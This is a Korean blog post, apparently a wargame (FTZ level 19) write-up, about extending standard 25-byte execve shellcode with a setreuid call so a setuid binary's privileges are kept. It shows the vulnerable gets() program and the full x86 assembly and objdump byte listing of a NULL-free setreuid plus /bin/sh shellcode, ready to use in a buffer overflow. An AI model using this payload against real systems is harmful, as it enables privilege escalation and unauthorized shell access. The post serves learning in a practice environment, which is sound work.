---
title: "Custom Shellcode(with. setreuid)"
tags: [shellcode]
categories: [System]
---

표준 25byte shellcode에 기능 추가하기
-------------------------------------

1. [Problem](#개요)
2. [Solve](#문제해결)
3. [Additional](#additional)

## 개요

FTZ 19번 문제는 다음과 같이 짧은 코드로 구성되어 있었습니다.

```c
main()
{ 
  char buf[20];
  gets(buf);
  printf("%s\n",buf);
}
```

setuid를 통해 level20 계정의 권한으로 설정되어 있긴 하였지만 가장 기본적으로 사용할 수 있는 25byte shellcode를 사용하였을 때 shell이 level19의 권한으로 실행되는 것을 확인할 수 있었습니다.

별도의 함수가 존재하지 않기에 처음에는 my-pass 명령을 직접적으로 전달하도록 시도해보려고 하였으나 마땅한 방법을 찾지 못하여 setreuid 함수를 통해 level20의 권한으로 실행되도록 shellcode를 변경하였습니다.

## 문제해결

변경한 shellcode의 경우 다음과 같이 작성하였습니다.

```
section .text
        global _start

_start:
        mov bx, 0xc1c
        mov cx, 0xc1c
        mov al, 0x46
        int 0x80
        xor eax, eax 
        push eax 
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp 
        push eax 
        push ebx 
        mov ecx, esp 
        mov edx, eax 
        mov al, 0xb 
        int 0x80
```

FTZ의 환경인 32bit에 맞춰서 제작하였으며 시작 부분에서 첫 번째 `int 0x80` 까지가 추가한 부분입니다. 처음에는 setuid 함수를 사용한 코드를 참조하여 작성하였으나 [링크](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit)의 call table에서 setuid를 찾을 수 없어 유사한 setreuid를 사용하였습니다.

setreuid를 호출할 때 ebx는 ruid, ecx는 euid의 값을 지정해주면 된다는 것도 call table 링크에서 확인할 수 있었습니다. 각각 level20의 uid인 3200을 16진수로 표기한 0xclc 값을 할당해주었습니다.

## Additional

처음에는 ebx, ecx에 값을 넣어주었는데 컴파일을 완료한 후 objdump로 확인했을 때 NULL 값이 포함되어 있길래 bx, cx로 바꿔 해결하였습니다.

위 사항을 수정 후에 최종적으로 아래와 같이 완성되었습니다.

```
08048060 <_start>:
 8048060:	66 bb 1c 0c          	mov    $0xc1c,%bx
 8048064:	66 b9 1c 0c          	mov    $0xc1c,%cx
 8048068:	b0 46                	mov    $0x46,%al
 804806a:	cd 80                	int    $0x80
 804806c:	31 c0                	xor    %eax,%eax
 804806e:	50                   	push   %eax
 804806f:	68 2f 2f 73 68       	push   $0x68732f2f
 8048074:	68 2f 62 69 6e       	push   $0x6e69622f
 8048079:	89 e3                	mov    %esp,%ebx
 804807b:	50                   	push   %eax
 804807c:	53                   	push   %ebx
 804807d:	89 e1                	mov    %esp,%ecx
 804807f:	89 c2                	mov    %eax,%edx
 8048081:	b0 0b                	mov    $0xb,%al
 8048083:	cd 80                	int    $0x80
```
